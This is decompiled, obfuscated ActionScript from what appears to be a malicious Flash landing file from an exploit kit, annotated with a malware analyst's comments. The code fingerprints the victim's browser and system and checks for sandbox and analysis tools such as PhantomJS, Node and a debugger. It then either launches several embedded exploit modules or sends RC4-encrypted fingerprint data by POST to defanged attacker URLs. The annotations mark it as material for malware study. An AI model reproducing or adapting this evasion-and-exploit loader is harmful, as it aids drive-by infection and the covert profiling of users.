package
{
   import flash.display.MovieClip;
   import flash.utils.ByteArray;
   import flash.events.Event;
   import Res.Res;
   import blobs.nw8;
   import blobs.nw7;
   import blobs.nw22;
   import blobs.nw23;
   import blobs.nw24;
   import blobs.nw2;
   import flash.external.ExternalInterface;
   import Crypt.Crypt;
   import flash.text.Font;
   import flash.system.Capabilities;
   import flash.net.URLRequest;
   import flash.net.URLLoader;
   
   public final class landing extends MovieClip
   {
       
      private var m_myStr01:String;
      
      private var targets_info:Object;
      
      private var config_json:Object;
      
      private var m_myArray01:ByteArray;
      
      public function landing()
      {
         if(!_loc1_)
         {
            super();
         }
      }
      
      public final function et(param1:ByteArray) : void
      {
         if(!_loc2_)
         {
            this.m_myArray01 = param1;
            if(!_loc3_)
            {
               if(stage)
               {
                  if(!_loc2_)
                  {
                     this.init();
                     if(_loc3_)
                     {
                     }
                  }
               }
               else
               {
                  addEventListener("addedToStage",this.init);
               }
            }
         }
      }
      
      private final function init(param1:Event = null) : void
      {
         if(!_loc4_)
         {
            removeEventListener("addedToStage",this.init);
            if(!_loc4_)
            {
               this.m_myStr01 = "kpbbwoff17384";
               if(!_loc3_)
               {
                  §§push(false);
                  if(!_loc4_)
                  {
                     §§push(this.checkEnvironment());
                     if(!_loc4_)
                     {
                        if(§§pop() === §§pop())
                        {
                           if(!_loc3_)
                           {
                              return;
                           }
                        }
                        else
                        {
                           this.collectBrowserInfo();
                           if(!_loc3_)
                           {
                              §§push(false);
                              if(!_loc4_)
                              {
                                 §§push(this.decodeRtConfig());
                                 if(!_loc3_)
                                 {
                                    if(§§pop() === §§pop())
                                    {
                                       if(!_loc3_)
                                       {
                                          return;
                                       }
                                       addr145:
                                    }
                                    else
                                    {
                                       §§push(false);
                                       if(_loc4_)
                                       {
                                       }
                                       addr132:
									   // cf {'debug': {'flash': False}
                                       if(§§pop() === this.config_json.debug.flash)
                                       {
                                          if(_loc3_)
                                          {
                                          }
                                          §§goto(addr145);
                                       }
                                    }
                                    return;
                                 }
                              }
                           }
                        }
                        addr139:
                        if(!_loc4_)
                        {
                        }
                        this.onSuccess(null,null);
                        §§goto(addr145);
                     }
                     addr75:
                     addr94:
                     if(§§pop() === §§pop())
                     {
                        if(!_loc4_)
                        {
						   // pings back to link.bot
                           this.postBotInfo();
                           if(_loc3_)
                           {
                           }
                           §§goto(addr139);
                        }
                     }
					 // pings back to link.jsPing
                     this.jsPing();
                     if(_loc4_)
                     {
                     }
                     §§goto(addr145);
                  }
                  §§goto(addr75);
                  §§push(this.checkBrowserInfo());
               }
            }
            if(_loc4_)
            {
               addr109:
               return;
            }
            §§goto(addr132);
            §§push(true);
         }
         if(_loc3_)
         {
            §§goto(addr94);
         }
         §§goto(addr109);
      }
      
	  // if the fingerprinting JavaScript succeeds, i.e. if it didn't detect any suspicious
	  // analyst tool (such as VMWare, etc.), 
	  // it does not ping back (backUrl is used in the config file but it is empty)
      public final function onSuccess(param1:String, param2:int) : void
      {
		 // instantiate the exploits if we are not in an analyst environment
         var _loc4_:nw8 = new nw8(this.config_json,this.targets_info);
         var _loc3_:nw7 = new nw7(this.config_json,this.targets_info);
         var _loc8_:nw22 = new nw22(this.config_json,this.targets_info);
         if(!_loc10_)
         {
            addChild(_loc8_);
         }
         var _loc6_:nw23 = new nw23(this.config_json,this.targets_info);
         if(!_loc9_)
         {
            addChild(_loc6_);
         }
         var _loc5_:nw24 = new nw24(this.config_json,this.targets_info);
         if(!_loc9_)
         {
            addChild(_loc5_);
         }
         var _loc7_:nw2 = new nw2(this.config_json,this.targets_info);
         if(!_loc10_)
         {
            §§push(false);
            if(!_loc9_)
            {
               §§push(_loc3_.isSuitable());
               if(!_loc10_)
               {
                  §§push(§§pop() === §§pop());
                  if(!_loc10_)
                  {
                     §§push(§§pop());
                     if(!_loc10_)
                     {
                        if(§§pop())
                        {
                           if(!_loc10_)
                           {
                              §§pop();
                              if(!_loc9_)
                              {
                                 §§push(false);
                                 if(_loc10_)
                                 {
                                 }
                              }
                              addr209:
						      // cf 'link': {'backUrl': '',
                              ExternalInterface.call("function (){ window.location = \'" + this.config_json.link.backUrl + "\'; }");
                           }
                           addr133:
                           §§pop();
                           addr201:
                           if(!_loc10_)
                           {
                              §§push(false);
                              if(!_loc10_)
                              {
                                 §§push(_loc8_.isSuitable());
                                 if(_loc10_)
                                 {
                                 }
                                 addr175:
                                 if(§§pop())
                                 {
                                    if(!_loc9_)
                                    {
                                       addr179:
                                       §§pop();
                                       if(!_loc9_)
                                       {
                                          §§push(false);
                                          if(_loc10_)
                                          {
                                          }
                                       }
                                    }
                                    addr197:
                                    §§push(§§pop() === _loc5_.isSuitable());
                                 }
                              }
                              addr149:
                              §§push(§§pop());
                              if(!_loc9_)
                              {
                                 if(§§pop())
                                 {
                                    if(!_loc9_)
                                    {
                                       §§pop();
                                       if(!_loc10_)
                                       {
                                          §§push(false);
                                          if(!_loc9_)
                                          {
                                             §§push(_loc6_.isSuitable());
                                             if(_loc10_)
                                             {
                                             }
                                             §§goto(addr197);
                                          }
                                          §§goto(addr197);
                                       }
                                    }
                                 }
                                 addr172:
                                 §§push(§§pop());
                                 if(!_loc10_)
                                 {
                                    §§goto(addr175);
                                 }
                                 §§goto(addr197);
                              }
                              §§push(§§pop() === §§pop());
                              if(!_loc10_)
                              {
                                 §§goto(addr172);
                              }
                              §§goto(addr179);
                           }
						   // 'link': {'backUrl': '',
                           if("" != this.config_json.link.backUrl)
                           {
                              if(!_loc10_)
                              {
                                 §§goto(addr209);
                              }
                           }
                        }
                        addr126:
                        §§push(§§pop());
                        if(!_loc9_)
                        {
                           if(§§pop())
                           {
                              if(!_loc9_)
                              {
                                 §§goto(addr133);
                              }
                              §§goto(addr172);
                           }
                           §§goto(addr149);
                        }
                        §§goto(addr197);
                     }
                     addr122:
                     §§push(§§pop() === §§pop());
                     if(!_loc9_)
                     {
                        §§goto(addr126);
                     }
                  }
                  §§push(_loc4_.isSuitable());
                  if(!_loc10_)
                  {
                     §§goto(addr122);
                  }
                  §§goto(addr197);
               }
               §§push(§§pop() === §§pop());
               if(!_loc10_)
               {
                  §§goto(addr149);
               }
               §§goto(addr172);
            }
            if(§§pop())
            {
               if(!_loc9_)
               {
                  §§goto(addr201);
               }
            }
         }
      }
      
	  // If the fingerprinting JavaScript fails, i.e. it executes in a VM, etc,
	  // it pings back to the "soft" URL.
      public final function onFailed(param1:String, param2:int) : void
      {
         if(!_loc5_)
         {
            this.targets_info.marker = "browserInfo";
            if(!_loc5_)
            {
               this.targets_info.softList = param1;
               if(_loc4_)
               {
               }
            }
            this.targets_info.timeDelta = param2;
         }
         var _loc3_:ByteArray = new ByteArray();
         if(!_loc4_)
         {
            _loc3_.writeUTFBytes(this.objectToJson(this.targets_info));
         }
         if(_loc4_)
         {
            loop0:
            while(true)
            {
			   // 'link': {'soft': 'hxxp://zodlp[.]aebeike[.]xyz/bosom/bmpzbWFvYmdr'},
               this.postBinary(this.config_json.link.soft,_loc3_);
               if(!_loc4_)
               {
                  if(!_loc5_)
                  {
                  }
                  addr115:
                  return;
               }
               addr104:
               while(true)
               {
                  if(_loc4_)
                  {
                     break loop0;
                  }
                  continue loop0;
               }
               §§goto(addr115);
            }
            §§goto(addr115);
         }
         while(true)
         {
            _loc3_ = Crypt.rc4(_loc3_,this.m_myStr01);
            §§goto(addr104);
         }
      }
      
      private final function checkEnvironment() : Boolean
      {
         if(!_loc1_)
         {
            §§push(false);
            if(!_loc2_)
            {
               if(§§pop() !== ExternalInterface.available)
               {
                  §§push(true);
               }
            }
            addr29:
            return §§pop();
         }
         §§push(false);
         if(!_loc2_)
         {
            return §§pop();
         }
         §§goto(addr29);
      }
      
      private final function checkBrowserInfo() : Boolean
      {
         if(!_loc1_)
         {
            §§push(true);
            if(!_loc2_)
            {
               if(§§pop() === this.targets_info.isPhantom)
               {
                  if(!_loc1_)
                  {
                     §§push(false);
                     if(!_loc2_)
                     {
                        return §§pop();
                     }
                     addr77:
                     return §§pop();
                  }
                  addr87:
                  §§push(false);
                  if(_loc2_)
                  {
                  }
               }
               else
               {
                  §§push(true);
                  if(!_loc2_)
                  {
                     if(§§pop() === this.targets_info.isNodeJs)
                     {
                        if(!_loc1_)
                        {
                           §§push(false);
                           if(!_loc1_)
                           {
                              return §§pop();
                           }
                           addr58:
                           if(§§pop() === this.targets_info.isCouchJs)
                           {
                              if(_loc2_)
                              {
                                 §§goto(addr87);
                              }
                           }
                           else
                           {
                              §§push(true);
                              if(!_loc2_)
                              {
                                 if(§§pop() === this.targets_info.isRhino)
                                 {
                                    if(!_loc2_)
                                    {
                                       §§goto(addr87);
                                    }
                                 }
                                 else
                                 {
                                    §§push(true);
                                    if(!_loc2_)
                                    {
                                       addr95:
                                       if(§§pop() !== this.targets_info.isDebugger)
                                       {
                                          §§push(true);
                                       }
                                    }
                                 }
                                 addr102:
                                 return §§pop();
                              }
                           }
                        }
                        §§push(false);
                        if(!_loc2_)
                        {
                           §§goto(addr102);
                        }
                     }
                     else
                     {
                        §§push(true);
                        if(!_loc2_)
                        {
                           §§goto(addr58);
                        }
                     }
                  }
               }
               return §§pop();
            }
            return §§pop();
         }
         §§push(false);
         if(!_loc2_)
         {
            §§goto(addr77);
         }
         else
         {
            §§goto(addr95);
         }
      }
      
      private final function collectBrowserInfo() : void
      {
         §§push(String(ExternalInterface.call("function(){return window.navigator.appName;}")));
         if(!_loc11_)
         {
            §§push(§§pop());
         }
         var _loc2_:* = §§pop();
         §§push(String(ExternalInterface.call("function(){return window.navigator.appCodeName;}")));
         if(!_loc11_)
         {
            §§push(§§pop());
         }
         var _loc10_:* = §§pop();
         §§push(String(ExternalInterface.call("function(){return window.navigator.vendor;}")));
         if(!_loc12_)
         {
            §§push(§§pop());
         }
         var _loc5_:* = §§pop();
         var _loc1_:Boolean = ExternalInterface.call("function(){return navigator.cookieEnabled;}");
         var _loc9_:Boolean = ExternalInterface.call("function(){return !!window.callPhantom;}");
         var _loc3_:Boolean = ExternalInterface.call("function(){return !!window.Buffer;}");
         var _loc7_:Boolean = ExternalInterface.call("function(){return !!window.emit;}");
         var _loc8_:Boolean = ExternalInterface.call("function(){return !!window.spawn;}");
         §§push(String(ExternalInterface.call("function(){return navigator.userAgent;}")));
         if(!_loc12_)
         {
            §§push(§§pop());
         }
         var _loc4_:* = §§pop();
         var _loc6_:Boolean = ExternalInterface.call("function(){return /*@cc_on!@*/false || !!document.documentMode;}");
         if(!_loc12_)
         {
            this.targets_info = {
               "userAgent":_loc4_,
               "cntFonts":Font.enumerateFonts(true).length,
               "cpuArchitecture":Capabilities.cpuArchitecture,
               "isDebugger":Capabilities.isDebugger,
               "playerType":Capabilities.playerType,
               "os":Capabilities.os,
               "language":Capabilities.language,
               "flashVer":Capabilities.version,
               "screenColor":Capabilities.screenColor,
               "screenDPI":Capabilities.screenDPI,
               "screenResolutionX":Capabilities.screenResolutionX,
               "screenResolutionY":Capabilities.screenResolutionY,
               "supports32BitProcesses":Capabilities.supports32BitProcesses,
               "supports64BitProcesses":Capabilities.supports64BitProcesses,
               "externalInterface":ExternalInterface.available,
               "isIe":_loc6_,
               "cookieEnabled":_loc1_,
               "appName":_loc2_,
               "appCodeName":_loc10_,
               "vendor":_loc5_,
               "isPhantom":_loc9_,
               "isNodeJs":_loc3_,
               "isCouchJs":_loc7_,
               "isRhino":_loc8_
            };
         }
      }
      
      private final function decodeRtConfig() : Boolean
      {
         §§push(this.m_myStr01);
         if(!_loc6_)
         {
            §§push(§§pop());
         }
         if(!_loc7_)
         {
            §§push(0);
            if(_loc7_)
            {
               §§push(-(§§pop() - 1 - 1 + 1 - 50));
            }
            if(!_loc6_)
            {
               if(§§pop() !== _loc5_.length)
               {
                  §§push(0);
                  if(_loc7_)
                  {
                     §§push(§§pop() - 1 - 1 - 1);
                  }
               }
            }
            §§push(_loc3_);
            §§push(3);
            if(_loc7_)
            {
               §§push(-(§§pop() + 104 + 22));
            }
            if(!_loc7_)
            {
               §§push(parseInt);
               §§push(this);
               §§push(_loc2_);
               §§push(16);
               if(_loc6_)
               {
                  §§push((§§pop() + 1) * 2 * 7);
               }
               if(_loc7_)
               {
               }
               addr127:
               if(!_loc7_)
               {
               }
               if(!_loc6_)
               {
                  if(!_loc7_)
                  {
                  }
                  this.config_json = JSON.parse(_loc4_.toString());
                  if(_loc7_)
                  {
                  }
                  addr191:
                  if(!_loc6_)
                  {
                  }
                  §§push(false);
                  if(!_loc7_)
                  {
                     return §§pop();
                  }
                  addr199:
                  return §§pop();
               }
               if(!_loc6_)
               {
               }
			   // 'marker': 'rtConfig'}
               if("rtConfig" !== this.config_json.marker)
               {
                  §§goto(addr191);
               }
               else
               {
                  §§push(true);
               }
               §§goto(addr199);
            }
            if(!_loc7_)
            {
            }
            §§push(_loc4_);
            §§push(_loc3_);
            §§push(3);
            if(_loc7_)
            {
               §§push((-§§pop() - 1 + 13) * 32 + 47);
            }
            §§pop().writeBytes(§§pop(),§§pop(),_loc1_);
            §§goto(addr127);
         }
         return false;
      }
      
      private final function jsPing() : void
      {
         if(!_loc2_)
         {
			//"flashPing" not defined so dont go here
            if(false === this.config_json.debug.flashPing)
            {
               if(!_loc2_)
               {
                  return;
               }
            }
            else
            {
			   // 'link': { 'jsPing': 'hxxp://zodlp[.]aebeike[.]xyz/chance/family-structure-misery-20446186',
               ExternalInterface.call("function(){var pImg = new Image(); pImg.src= \'" + this.config_json.link.jsPing + "\';}");
            }
         }
      }
      
      private final function objectToJson(param1:Object) : String
      {
         var _loc3_:* = null;
         §§push([]);
         if(!_loc8_)
         {
            §§push(§§pop());
         }
         var _loc2_:* = §§pop();
         §§push(0);
         if(_loc7_)
         {
            §§push((-(§§pop() * 119 + 22) - 75 + 116) * 41 + 1);
         }
         var _loc6_:* = §§pop();
         var _loc5_:* = param1;
         if(!_loc8_)
         {
            for(var _loc4_ in param1)
            {
               if(!_loc7_)
               {
                  §§push(param1[_loc4_] is String);
                  if(!_loc7_)
                  {
                     if(§§pop())
                     {
                        if(!_loc8_)
                        {
                           §§push(_loc2_);
                           if(!_loc7_)
                           {
                              §§push("\"");
                              if(!_loc8_)
                              {
                                 §§push(_loc4_);
                                 if(!_loc8_)
                                 {
                                    §§push(§§pop() + §§pop());
                                    if(!_loc7_)
                                    {
                                       §§push("\":\"");
                                       if(!_loc7_)
                                       {
                                          §§push(§§pop() + §§pop());
                                          if(!_loc7_)
                                          {
                                             §§push(§§pop() + param1[_loc4_]);
                                             if(_loc8_)
                                             {
                                             }
                                             addr138:
                                             §§push(§§pop() + param1[_loc4_]);
                                             if(_loc7_)
                                             {
                                             }
                                             addr178:
                                             addr200:
                                             §§push(§§pop() + param1[_loc4_]);
                                             if(!_loc8_)
                                             {
                                                addr185:
                                                §§pop().push(§§pop());
                                                addr197:
                                                if(!_loc7_)
                                                {
                                                   addr189:
                                                   if(param1[_loc4_] == null)
                                                   {
                                                      if(_loc8_)
                                                      {
                                                         continue;
                                                      }
                                                   }
                                                   else
                                                   {
                                                      continue;
                                                   }
                                                }
                                                §§push(_loc2_);
                                                §§push("\"");
                                                if(_loc7_)
                                                {
                                                }
                                                addr216:
                                                §§pop().push(§§pop());
                                                continue;
                                             }
                                             §§push(§§pop() + _loc4_);
                                             if(!_loc7_)
                                             {
                                                addr214:
                                                §§push(§§pop() + "\":null");
                                             }
                                             §§goto(addr216);
                                          }
                                          §§pop().push(§§pop());
                                          if(_loc7_)
                                          {
                                             continue;
                                          }
                                       }
                                       addr174:
                                       §§push(§§pop() + §§pop());
                                       if(!_loc7_)
                                       {
                                          §§goto(addr178);
                                       }
                                       §§goto(addr214);
                                    }
                                    §§push("\"");
                                    if(!_loc7_)
                                    {
                                       §§push(§§pop() + §§pop());
                                       if(!_loc8_)
                                       {
                                          §§pop().push(§§pop());
                                          if(_loc7_)
                                          {
                                          }
                                       }
                                       §§goto(addr178);
                                    }
                                    §§goto(addr214);
                                 }
                                 addr129:
                                 §§push(§§pop() + §§pop());
                                 if(!_loc7_)
                                 {
                                    §§push("\":");
                                    if(!_loc8_)
                                    {
                                       §§push(§§pop() + §§pop());
                                       if(!_loc8_)
                                       {
                                          §§goto(addr138);
                                       }
                                       §§goto(addr200);
                                    }
                                    §§goto(addr214);
                                 }
                                 §§goto(addr185);
                              }
                              addr171:
                              §§push("\":");
                              if(!_loc7_)
                              {
                                 §§goto(addr174);
                              }
                              §§goto(addr214);
                           }
                           addr123:
                           §§push("\"");
                           if(!_loc8_)
                           {
                              §§push(_loc4_);
                              if(!_loc8_)
                              {
                                 §§goto(addr129);
                              }
                              §§goto(addr200);
                           }
                           §§goto(addr214);
                        }
                        addr158:
                        §§push(_loc2_);
                        if(!_loc8_)
                        {
                           addr161:
                           §§push("\"");
                           if(!_loc7_)
                           {
                              §§push(_loc4_);
                              if(!_loc7_)
                              {
                                 §§push(§§pop() + §§pop());
                                 if(_loc8_)
                                 {
                                 }
                                 §§goto(addr214);
                              }
                              §§goto(addr200);
                           }
                           §§goto(addr171);
                        }
                        §§goto(addr197);
                     }
                     §§push(param1[_loc4_] is Boolean);
                     if(!_loc7_)
                     {
                        if(§§pop())
                        {
                           if(!_loc7_)
                           {
                              §§push(_loc2_);
                              if(!_loc7_)
                              {
                                 §§goto(addr123);
                              }
                              §§goto(addr161);
                           }
                        }
                     }
                  }
                  addr154:
                  if(§§pop())
                  {
                     if(!_loc8_)
                     {
                        §§goto(addr158);
                     }
                     else
                     {
                        continue;
                     }
                  }
                  §§goto(addr189);
               }
               §§goto(addr154);
               §§push(param1[_loc4_] is int);
            }
         }
         _loc3_ = _loc2_.join(",");
         if(!_loc8_)
         {
            §§push("{");
            if(!_loc7_)
            {
               §§push(§§pop() + _loc3_);
               if(_loc8_)
               {
               }
               addr235:
               §§push(§§pop());
               addr241:
               if(!_loc7_)
               {
                  _loc3_ = §§pop();
               }
               return §§pop();
            }
            §§goto(addr235);
            §§push(§§pop() + "}");
         }
         §§goto(addr241);
      }
      
      private final function postBotInfo() : void
      {
         if(!_loc2_)
         {
            this.targets_info.marker = "browserInfo";
            if(!_loc3_)
            {
               if(!_loc2_)
               {
               }
               _loc1_.writeUTFBytes(this.objectToJson(this.targets_info));
            }
         }
         if(_loc2_)
         {
            loop0:
            while(true)
            {
		       // 'link': { 'bot': 'hxxp://zodlp[.]aebeike[.]xyz/metal/1375169/unconscious-damage-straighten-absence-cart-aunt-anyway-thread-dusty',
               this.postBinary(this.config_json.link.bot,_loc1_);
               if(!_loc3_)
               {
                  if(!_loc2_)
                  {
                  }
                  addr115:
                  return;
               }
               addr104:
               while(true)
               {
                  if(_loc3_)
                  {
                     break loop0;
                  }
                  continue loop0;
               }
               §§goto(addr115);
            }
            §§goto(addr115);
         }
         while(true)
         {
            §§goto(addr104);
         }
      }
      
      private final function postBinary(param1:String, param2:ByteArray) : void
      {
         var _loc4_:URLRequest = new URLRequest(param1);
         var _loc3_:URLLoader = new URLLoader();
         if(!_loc8_)
         {
            _loc4_.contentType = "application/octet-stream";
            if(!_loc7_)
            {
               _loc4_.method = "POST";
               if(_loc7_)
               {
               }
               try
               {
                  addr61:
                  _loc3_.load(_loc4_);
                  return;
               }
               catch(error:ArgumentError)
               {
                  return;
               }
               catch(error:SecurityError)
               {
                  return;
               }
               return;
            }
         }
         _loc4_.data = param2;
         §§goto(addr61);
      }
   }
}
